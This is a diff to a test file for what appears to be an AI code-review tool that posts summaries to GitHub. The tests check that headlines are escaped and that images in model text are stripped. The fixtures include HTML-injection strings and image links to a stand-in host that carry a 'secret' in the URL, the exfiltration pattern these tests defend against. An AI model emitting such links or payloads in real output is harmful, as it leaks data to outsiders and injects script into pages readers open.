@@ -169,8 +169,21 @@ test("the repo's own checks get a chip only when they found something", () => {
 });
 
 test("the headline can't close the alert or add HTML", () => {
-  const body = renderSummary({ ...review, headline: 'Bad <img src=x onerror=alert(1)>\n\n# not a heading' }, [], undefined, info);
-  expect(body).toContain('> Bad &lt;img src=x onerror=alert(1)&gt;\n> \n> # not a heading\n>\n');
+  const body = renderSummary({ ...review, headline: 'Bad <a href=x onclick=y>\n\n# not a heading' }, [], undefined, info);
+  expect(body).toContain('> Bad &lt;a href=x onclick=y&gt;\n> \n> # not a heading\n>\n');
+});
+
+test('images in model text are stripped before posting, so a URL in one carries nothing out', () => {
+  const leak = 'See ![x](https://evil.example/?t=secret) and ![a [b]](https://evil.example/2) and <img src="https://evil.example/3"> and ![r][ref].';
+  const placed = place([finding({ file: 'src/config.ts', line: 10, title: `t ${leak}`, body: leak })], files, 'summary');
+  const full = renderSummary({ ...review, headline: leak, claim: leak }, placed, undefined, info);
+  // The hidden state line keeps the raw title for matching; GitHub never renders it.
+  const body = full.slice(0, full.lastIndexOf('\n<!-- shaft:state'));
+  expect(body).not.toContain('evil.example');
+  expect(body).not.toContain('![');
+  expect(body).toContain('See  and  and  and .');
+  const [inline] = place([finding({ body: leak })], files, 'summary');
+  expect(inlineBody(inline)).not.toContain('evil.example');
 });
 
 test("a title or body with | or a line break can't break the table; a range links L<line>-L<end>", () => {
